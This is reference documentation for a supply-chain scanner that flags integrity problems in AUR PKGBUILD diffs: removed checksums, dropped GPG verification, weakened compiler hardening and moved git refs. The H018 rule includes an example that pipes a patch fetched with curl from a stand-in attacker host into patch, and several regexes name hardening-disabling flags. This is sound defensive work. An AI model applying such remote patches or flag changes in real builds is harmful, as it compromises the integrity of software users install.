<!-- description: Rules for a verification the recipe carried being weakened, removed, or unable to cover what it claims: checksums, signatures and build flags. -->

# Integrity and Verification

A verification the recipe carried is weakened, removed, or cannot cover
what it claims to. The checksum rules (H001, H002, C001 to C005) and the
signature rules (H005, H024, H078) are the core; the build-flag rules
(H008, R049, R050, H025, H047, H079) are the same claim applied to
mitigations rather than to sources.

The asymmetry is deliberate throughout. Declaring verification costs an
attacker nothing, so a declaration is reported at weight 0 as a
[P-series](system.md#declared-practice) fact. Removing verification is a
change to the recipe's own prior behaviour, which is evidence, so it
scores. See [B10](../../security.md#b10-positive-evidence-is-reported-never-credited).

See [the rule system reference](system.md) for the field table, the
severity weights and the reserved identifier ranges.

---

<!-- generated: page-index -->
## Rules on this page

| Rule | Name | Severity |
|---|---|---|
| [C001](#c001) | Checksum Changed Without Source Change With Stable Version | HIGH |
| [C002](#c002) | Checksum Updated With Version Bump | INFO |
| [C003](#c003) | Source URL Changed Without Version Bump | INFO |
| [C004](#c004) | Checksum Removed For Unchanged Source | CRITICAL |
| [C005](#c005) | Binary Artifact From Untrusted Source | MEDIUM |
| [C008](#c008) | Unread Content Moved Under A Stable Version | HIGH |
| [C009](#c009) | Unread Content Moved With The Version | INFO |
| [H001](#h001) | Checksum Disabled | HIGH |
| [H002](#h002) | Checksum Emptied | HIGH |
| [H005](#h005) | validpgpkeys Added | MEDIUM |
| [H008](#h008) | Suspicious Environment Variable | MEDIUM |
| [H018](#h018) | Patch Applied From Outside The Build Tree | HIGH |
| [H019](#h019) | Source URL Downgraded To HTTP | MEDIUM |
| [H024](#h024) | GPG Verification Removed | HIGH |
| [H025](#h025) | Build Environment Subversion | HIGH |
| [H033](#h033) | Moved Git Ref | HIGH |
| [H047](#h047) | Security-Relevant Build Flag Change | HIGH |
| [H066](#h066) | Embedded Binary In Tree | HIGH |
| [H070](#h070) | Archive Trailer Anomaly | HIGH |
| [H078](#h078) | Signing Key Set Changed | HIGH |
| [H079](#h079) | Build Flags Weakened | HIGH |
| [H087](#h087) | Recipe Changed Without Upstream | MEDIUM |
| [H091](#h091) | Checksum Array Shorter Than Source Array | HIGH |
| [H092](#h092) | Metadata Names A Source The Recipe Does Not | HIGH |
| [R049](#r049) | Compiler Plugin Or Loader Override | MEDIUM |
| [R050](#r050) | Compiler Hardening Disabled | MEDIUM |
<!-- /generated: page-index -->

### H001: Checksum Disabled {#h001}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25), downgraded to INFO (weight 0) if justified
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=SKIP` appears in the diff.
- **Justification:** Severity is downgraded to INFO if the diff contains a VCS source (`git+https://`, `.git`), a signature file (`.sig`, `.asc`), `validpgpkeys` declaration, or DKMS reference. Justification checked via `is_skip_justified()` in `src/trustsight/differ.py`.
- **Note:** Hard-coded in `src/trustsight/analysis/structural.py`. Cannot be disabled through `rules.toml` because checksum integrity is foundational to the scoring model.

### H002: Checksum Emptied {#h002}

- **Target:** programmatic (not TOML-configurable)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** Fires when `sha256sums=()` appears in the diff (array set to empty).
- **Note:** Hard-coded in `src/trustsight/analysis/structural.py`. Cannot be disabled through `rules.toml`.

### H005: validpgpkeys Added {#h005}

H005 is retained as a documentation anchor for a retired rule. It is not in the
shipped ruleset and emits no finding. A post-diff `validpgpkeys` declaration is
reported as `P002` at weight 0; changes to an existing signing-key set are
handled by H078, and removal is handled by H024.

### H008: Suspicious Environment Variable {#h008}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*=\s*"[^"]`
- **Description:** Detects a quoted build-flag assignment that does not begin with an empty string, the shape of a fertilizer injected into an existing flags string (e.g. `CFLAGS="$(…)"` carries a substitution). Pairs with the R049/R050 compiler-flag rules in the expanded scope, which match the `+=` form.

### C001: Checksum Changed Without Source Change With Stable Version {#c001}

- **Severity:** HIGH (weight 25)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did not change.
- **Description:** A checksum changed with no corresponding version or source change is anomalous. It suggests the tarball content changed without an upstream version bump, which is a red flag for supply-chain compromise.

### C002: Checksum Updated With Version Bump {#c002}

- **Severity:** INFO (weight 0)
- **Condition:** `sha256sums` value changed (added or modified), **no** source URLs were added or removed, **and** `pkgver` did change.
- **Description:** Normal during routine version bumps. Recorded for audit trail; contributes no weight.

### C003: Source URL Changed Without Version Bump {#c003}

- **Severity:** INFO (weight 0)
- **Condition:** Source URLs were both added **and** removed (the sets differ) **and** `pkgver` did not change.
- **Description:** Source URLs swapped without a version bump is noteworthy but not necessarily malicious. Recorded for audit trail; contributes no weight.

### C004: Checksum Removed For Unchanged Source {#c004}

- **Severity:** CRITICAL (weight 40)
- **Condition:** A checksum array line is deleted, no replacement checksum line is added, **and** the source URL set is unchanged.
- **Description:** Distinct from H002 (`sha256sums=()` added, array emptied in place): here the declaration disappears from the file entirely, leaving makepkg with nothing to verify against a source that itself did not change. Detected by `detect_checksum_removed()` in `src/trustsight/differ.py`.

### C005: Binary Artifact From Untrusted Source {#c005}

- **Severity:** MEDIUM (weight 15)
- **Condition:** An added source URL points at an executable artifact (`.bin`, `.exe`, `.elf`, `.so`, `.dll`, `.dylib`, `.AppImage`, `.deb`, `.rpm`, `.apk`, `.msi`, `.jar`, `.run`) **and** its bucket is neither `trusted_forge` nor `official`.
- **Description:** A prebuilt binary cannot be reviewed from the PKGBUILD, so its provenance is the only available evidence. Restricted to untrusted buckets deliberately: `-bin` packages repackaging a GitHub release are a large fraction of the AUR and firing on all of them would make the rule pure noise.

### C008: Unread Content Moved Under A Stable Version {#c008}

- **Severity:** HIGH (weight 25)
- **Condition:** A submodule gitlink or a Git-LFS object id changed, and `pkgver`/`pkgrel`/`epoch` did not.

The [upstream-payload gap](../../explanation/what-trustsight-cannot-see.md)
is real: a checksummed tarball's bytes are not in the diff, so a recipe can
look untouched while the code it builds is replaced. What *is* in the diff is
the carrier's **identity** - the checksum, the commit, the object id - and a
change to that with no version change is the same event
[H033](#h033) already claims for a git ref and
[C001](#c001) for a checksum.

Two carriers had no such claim. A submodule gitlink names code the repository
does not contain; an LFS pointer names bytes that are not there either.
Moving one is a content change with no content in the diff, which is exactly
the shape that reads as "nothing happened".

The version distinguishes the two readings, as it does for H033: an upstream
bump moves the pointer *and* the version, while moving it under a stable
version means anyone who already built this version gets different code than
anyone who builds it now.

### C009: Unread Content Moved With The Version {#c009}

- **Severity:** INFO (weight 0)
- **Condition:** The same carriers as [C008](#c008), moving alongside a version bump.

The ordinary reading, reported so that the pair is visible rather than only
the alarming half. A reader comparing two revisions can see that the bytes
behind the pointer changed even though no content appears in the diff.

### R049: Compiler Plugin Or Loader Override {#r049}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fplugin=|-Wl,--dynamic-linker=)`
- **Description:** `-fplugin=` loads an arbitrary shared object into the compiler; `-Wl,--dynamic-linker=` changes which loader the produced binary uses. Both alter the build without touching any source file.

### R050: Compiler Hardening Disabled {#r050}

- **Target:** `raw_line`
- **Severity:** MEDIUM (weight 15)
- **Category:** `build`
- **Pattern:** `\b(?:CFLAGS|CXXFLAGS|LDFLAGS)\s*\+?=.*(?:-fno-stack-protector|-z\s*execstack)`
- **Description:** Detects removal of stack-protector or NX protections from the build flags.

### H018: Patch Applied From Outside The Build Tree {#h018}

- **Target:** programmatic (resolved command lines)
- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Description:** `patch` or `git apply` inside a build function takes its input from a URL, an absolute path, or process substitution.

```bash
patch -p1 < <(curl https://evil.example/x.patch)   # fires
patch -p1 -i /tmp/x.patch                          # fires
patch -p1 -i "$srcdir/fix.patch"                   # does not fire
```

This rule deliberately does **not** check membership of `source=()`. Patches routinely arrive inside the extracted tarball, so absence from `source=()` does not mean a patch is undeclared, and no static check can separate the two. That broader form was measured at 2.13 % of benign diffs; asking where the input comes from instead measures 0.00 %.

### H019: Source URL Downgraded To HTTP {#h019}

- **Target:** programmatic (diff-aware)
- **Severity:** MEDIUM (weight 15)
- **Category:** `network`
- **Description:** A URL declared in `source=()` as `https://` before the diff appears as `http://` after it, with the same host and path. Plain http was never upgraded; this is a URL that lost its transport security.

Distinguishing a downgrade from a URL that was always http needs both sides of the diff, which is why `extract_source_array_urls()` takes a `side` parameter.

### H024: GPG Verification Removed {#h024}

- **Target:** programmatic (diff-aware)
- **Severity:** HIGH (weight 25) - corpus rate 0.03 %
- **Category:** `integrity`
- **Condition:** `validpgpkeys` was **populated before** the diff and is
  **emptied or removed after** - the package previously verified upstream
  signatures and now does not.

This is the exact inverse of the declared evidence. `detect_verification_evidence`
emits `P002` at weight 0 when signatures are present, reporting the claim without
crediting it; H024 adds a scoring signal when that protection is **removed**.
The asymmetry is deliberate: declaring verification costs an attacker nothing,
but removing it is a change to the recipe's own prior behaviour, which is
evidence. Dropping GPG verification is a strong supply-chain signal with
near-zero benign rate: maintainers almost never remove working signature
verification.

**Origin:** npm registry signatures and pnpm's `verifyStoreIntegrity` - both
tools treat a dropped integrity check as a critical signal. npm's `audit
signatures` command rejects packages whose registry ECDSA signature is missing
or mismatched; pnpm's content-addressable store refuses to link corrupted
files. H024 is the AUR analogue: `validpgpkeys` being removed means the
package dismantled a verification layer it previously had.

**Scope:** DELTA-scoped - fires on `validpgpkeys` *transitioning* from
populated to empty/absent, following the same structure as
`detect_checksum_changes` and `detect_checksum_removed` in `differ.py`.

### H025: Build Environment Subversion {#h025}

- **Target:** programmatic (resolved lines, position-scoped)
- **Severity:** HIGH (weight 25) for `LD_PRELOAD`/`LD_LIBRARY_PATH`;
  MEDIUM (weight 15) for `CFLAGS`/`LDFLAGS`/`MAKEFLAGS`/`PATH` -
  corpus rate 0.25 % (all HIGH; MEDIUM not observed)
- **Category:** `build`
- **Condition:** The diff **modifies** `LD_PRELOAD`, `LD_LIBRARY_PATH`,
  `CFLAGS`, `LDFLAGS`, `MAKEFLAGS`, or `PATH` **inside a build function**
  (`prepare`/`build`/`package`).

Injecting a malicious object via `LD_PRELOAD`/`LDFLAGS`, or redirecting the
compiler/linker via `PATH`, is a classic build-time attack - the untrusted
input silently subverts the build.

**Predicate discipline - the position+delta scope is essential:** `CFLAGS`
and `MAKEFLAGS` appear in a large fraction of benign PKGBUILDs (`makepkg`
sets them routinely; many packages tweak them legitimately). Matching their
*presence* file-wide would be a census - the C001 mistake repeated. The
signal is: the variable is **modified in the diff** (delta, not presence),
**inside a build-function body** (position), on **resolved lines** (post
variable-expansion, so obfuscation cannot hide it).

The split severity reflects the benign rate: `LD_PRELOAD` and
`LD_LIBRARY_PATH` are almost never legitimate inside a PKGBUILD build
function; `CFLAGS`/`LDFLAGS`/`MAKEFLAGS`/`PATH` have legitimate uses and may
need the corpus to set the right severity level.

**Origin:** Nix's build sandbox (denies build processes all network and only
exposes declared inputs) and cargo-crev's `build.rs` scrutiny (flags crates
that run arbitrary code at build time). Both recognise that *untrusted inputs
subverting the build* is the attack surface Nix closes and Cargo leaves open.
`LD_PRELOAD`/`LD_LIBRARY_PATH` mutation inside a build function is the AUR
equivalent of a `build.rs` that downloads and executes a binary.

### H033: Moved Git Ref {#h033}

- **Target:** programmatic (`analysis/network.py`)
- **Severity:** HIGH (weight 25) when a tag anchor is unchanged, MEDIUM (weight 15) otherwise
- **Category:** `integrity`
- **Condition:** Either the repository's commit pin moved while the declared version did not, or a digest `#commit=` was replaced by a movable `#tag=`/`#branch=`.

A tag is a name upstream can repoint at will, so "the same tag" is not the
same code twice. TrustSight never resolves a tag against the network (see
[the security model](../../security.md#the-invariants)),
so the rule works from
declared facts: the commit a recipe pins, and the version it claims.

- **Ref moved under a stable version.** The `#commit=`/`#revision=` digest
  changed, in the source fragment or in the `_commit`-family variable feeding
  it, while `pkgver`, `pkgrel`, `epoch` and the declared tag did not. Anyone
  who built this version yesterday has different code from anyone who builds
  it today, under one version string.
- **Pin loosened.** A digest became a tag or a branch. This is reported even
  during a version bump: dropping the pin is the change.

HIGH needs a tag anchor that is provably unchanged, which is literally "this
tag now resolves to a different commit". The reverse direction, a tag being
replaced by a digest, is tightening and stays quiet. A digest variable that
feeds a patch URL rather than a git ref is not a checkout pin, and the edit it
belongs to is C003's neutral fact.

Fire rate: 4 of 3246 benign diffs (0.12 %), all maintainers tracking a moving
patch branch under a fixed version, which is the shape the rule describes.

### H066: Embedded Binary In Tree {#h066}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** A file in the repository tree carries ELF magic (`\x7fELF`) and is not a declared `source=` filename.

H066 has two variants that split by evidence and never double-fire. **H066-tree**
is this one: it needs the file manifest, so it runs on the git path, where the
clone is always available, and on the corpus path when the AUR snapshot tarball
was fetched. When the corpus path has no snapshot, the result reports
`tree_analyzed = false` rather than reading as a full-coverage UNFLAGGED result.
**H066-blob**, an ELF blob encoded inside the PKGBUILD, is H068 with a magic
check, so an encoded ELF fires H068.

Does not fire on: a `-bin`/`-appimage`/`-wine` package whose binary arrives via
a declared `source=`, or on icons, fonts, `.desktop` files and test fixtures.

### H070: Archive Trailer Anomaly {#h070}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** An archive carries data past its declared trailer (gzip, tar or zip).

H070 is a pure function over bytes (`check_archive_trailer`). It is wired on
the corpus-side AUR snapshot path, where `fetch_pkgbuild_with_tree` already
has the tarball bytes and the analysis pipeline can surface the finding
without fetching any PKGBUILD-supplied URL.

That is deliberate rather than incomplete. Fetching what a PKGBUILD points at
would add an SSRF primitive, tell the attacker who scanned them, and break the
one-host boundary the [security model](../../security.md#the-invariants)
enforces. The only bytes TrustSight feeds to H070 are the AUR's own snapshot
tarball bytes, corpus-side, where downloads are centralised and distributed as
facts.

### H078: Signing Key Set Changed {#h078}

- **Severity:** HIGH (weight 25) on replacement, MEDIUM (weight 15) on addition, INFO (weight 0) on introduction
- **Category:** `integrity`
- **Condition:** `validpgpkeys` gains a fingerprint.

Whoever holds a key in `validpgpkeys` can ship code to every user of the
package, so the set changing is a trust change that the diff states outright.
H024 owns the removal case, verification being taken away. H078 owns the other
two: a key **replaced** (one fingerprint out, a different one in) means the same
sources are now trusted under a different holder, and a key **added** to an
existing set widens who may sign. Introducing `validpgpkeys` where there was
none is signature checking being switched on, so it is reported as a neutral
fact rather than as a finding against the package.

Fire rate: 6 of 3246 (0.18 %), two introductions and four upstream key
rotations.

### H079: Build Flags Weakened {#h079}

- **Severity:** HIGH (weight 25) when a mitigation is switched off, MEDIUM (weight 15) on a top-level replacement
- **Category:** `integrity`
- **Condition:** A recipe line assigns `CFLAGS`, `CXXFLAGS`, `CPPFLAGS`, `LDFLAGS`, `RUSTFLAGS` or `MAKEFLAGS` either to a value naming a disabling flag (`-fno-stack-protector`, `-D_FORTIFY_SOURCE=0`, `-U_FORTIFY_SOURCE`, `-no-pie`, `-Wl,-z,norelro`, ...) or, at the top level, to a literal set that does not reference the variable it replaces.

makepkg exports a hardened flag set. A recipe that appends to it keeps those
mitigations; one that assigns over it drops every mitigation the distribution
configured, and one that spells out a disabling flag drops a named one. Either
way the installed binary is built with weaker mitigations than the same source
built through the normal path, and no package metadata says so.

H025 already reports that a build function modified the environment, which is
the weaker claim, so H079 does not restate it: the MEDIUM branch is top-level
only, where H025 is blind and where the assignment also runs at parse time. A
value carrying no literal flag (`CFLAGS="${_cflags[@]}"`) is a set this rule
cannot read, so it says nothing about it. Only the recipe's own lines count; a
vendored Makefile inside a shipped patch is not the packager's assignment.

Fire rate: 3 of 3246 (0.09 %), all one wine package that genuinely disables
FORTIFY_SOURCE.

### H047: Security-Relevant Build Flag Change {#h047}

- **Severity:** HIGH (weight 25) when a flag was dropped, MEDIUM (weight 15) when one appeared
- **Category:** `build`
- **Condition:** A long-stable `configure_flags` set changed, and the change touches `[patterns] security_relevant_flags`.

Dropping a hardening flag is the weightier direction, because it removes a
mitigation the package had.

### H087: Recipe Changed Without Upstream {#h087}

- **Severity:** MEDIUM (weight 15)
- **Category:** `integrity`
- **Condition:** A dependency array changed **and** a build function changed, while `source=`, every `*sums=` array and `pkgver` did not.

The June 2026 AUR campaign did not touch the upstream software. It edited the
build recipe and nothing else, so a reviewer reading source URLs and checksums
- the fields that usually carry a supply-chain change - saw a package whose
upstream was provably identical to the version they already trusted.

H087 names that shape directly: the recipe moved and upstream did not. The
conjunction is what makes it specific. Any edit to `source=`, a checksum array
or `pkgver` means the package points at different upstream bytes, which is an
ordinary update however much else changed with it, and H087 stays silent.

Both halves of the recipe have to move, and that is measured rather than
assumed. Against the 3,246-diff locked benign corpus: `deps or build` fires on
11.53%, `deps only` on 4.36%, `build only` on 5.75%, and `deps and build` on
**1.42%**. The disjunction passes the 30% ceiling comfortably, but it is eight
times the noise for no additional detection - the campaign changed both,
because a new build dependency is useless without a build step that invokes
it. The conjunction also keeps H087 off two neighbours: a dependency added
with no build change is a packaging fix, and a build function edited with no
dependency change is [H015](../rules/system.md#h015), which is INFO precisely
because it fires on 21.4% of benign diffs.

It is MEDIUM because the shape is not exclusively malicious: a dependency
correction that also adjusts a build step is an ordinary packaging change.
What is unusual is a recipe-only change on a package that was *just adopted*
and whose build now fetches unpinned code, which is [H088](maintainer-and-metadata.md#h088).

### H091: Checksum Array Shorter Than Source Array {#h091}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** A wholly-added `source=()` with more elements than a
  wholly-added `*sums=()` in the same diff.

makepkg pairs `source=()` with each `*sums=()` by position, and no rule
looked at the two lengths together. A source slipped in beside a checksum
list nobody recounted scored nothing but priors - the array declares
verification for the entries it covers and says nothing about the one added
past its end.

**A diff shows a hunk, not a file.** An array that opens on a `+` line and
continues through unchanged entries is only partly visible. The rule reads an
array only when it opens *and* closes inside added lines with no context line
between; anything else is not something the diff knows.

**`name::url` is one source.** makepkg's rename form
(`"$_pkgsrc"::"git+$url.git"`) is a single element. Elements are split on
*unquoted* whitespace, not by a token pattern.

Zero occurrences in the 3,246-diff benign corpus.

### H092: Metadata Names A Source The Recipe Does Not {#h092}

- **Severity:** HIGH (weight 25)
- **Category:** `integrity`
- **Condition:** A URL host appearing in `.SRCINFO` that appears nowhere in
  the PKGBUILD.

`.SRCINFO` is *generated from* the PKGBUILD, and the analysis prefers it
wherever it is richer - structured `depends`, expanded sources. That
preference is trust, and nothing compared the two. A `.SRCINFO` naming a
source the recipe does not was simply believed, and an AUR helper resolving
dependencies from the metadata while makepkg builds from the recipe are
reading two different descriptions of the same package.

The comparison is by **host**, not by URL. A PKGBUILD writes
`source=("$url/archive/v$pkgver.tar.gz")` and `.SRCINFO` carries the expanded
result, so comparing URLs would report every package in the ecosystem. The
host survives expansion because it comes from `url=` or from a literal in
the array either way.

Measured across 50 real AUR repositories, no package has a `.SRCINFO` host
its PKGBUILD does not also name.
